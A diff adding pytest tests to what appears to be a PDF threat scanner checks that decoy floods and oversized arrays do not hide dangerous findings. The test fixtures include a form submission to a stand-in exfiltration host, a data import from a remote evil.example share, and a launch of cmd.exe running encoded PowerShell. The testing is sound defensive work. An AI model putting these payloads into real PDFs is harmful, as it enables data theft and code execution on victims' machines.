@@ -222,3 +222,29 @@ def test_a_repeat_flood_in_any_family_does_not_hide_a_distinct_finding():
     warns = eng._build_warnings(report)
     assert any("cmd.exe" in w.message for w in warns if w.code == "launch_action")
     assert "action.SubmitForm" in [w.code for w in warns]
+
+
+def test_a_huge_finding_array_is_capped_without_materialising_it():
+    # an attacker-sized array is streamed through the cap: at most `keep` Warnings are retained
+    # per family (each built one is dropped unless it is kept)
+    gen = (eng.Warning(code="form_field", message=f"m{i % 7}") for i in range(100_000))
+    codes, others, repeats = eng._split_distinct(gen, keep=5)
+    assert (len(codes), len(others), len(repeats)) == (1, 5, 5)
+    report = _report(formFields=[{"name": "f", "flags": []}] * 100_000)
+    assert len(eng._build_warnings(report)) <= 200
+
+
+def test_distinct_decoys_do_not_hide_a_different_action_type_or_a_command_launch():
+    report = _report(
+        actions=[{"type": "URI", "target": f"https://docs.example/ref/{i}"} for i in range(250)]
+        + [{"type": "SubmitForm", "submitUrl": "https://exfil.example/c"},
+           {"type": "ImportData", "importFile": r"\\evil.example\share\a.fdf"}],
+        launchActions=[{"operation": "open", "file": f"readme{i}.txt", "parameters": ""}
+                       for i in range(250)]
+        + [{"operation": "open", "file": "cmd.exe", "parameters": "/c powershell -enc AAAA"}])
+    warns = eng._build_warnings(report)
+    codes = [w.code for w in warns]
+    assert "action.SubmitForm" in codes and "action.ImportData" in codes
+    assert any("cmd.exe" in w.message for w in warns if w.code == "launch_action")
+    imp = [w for w in warns if w.code == "action.ImportData"]
+    assert imp and "evil.example" in imp[0].message
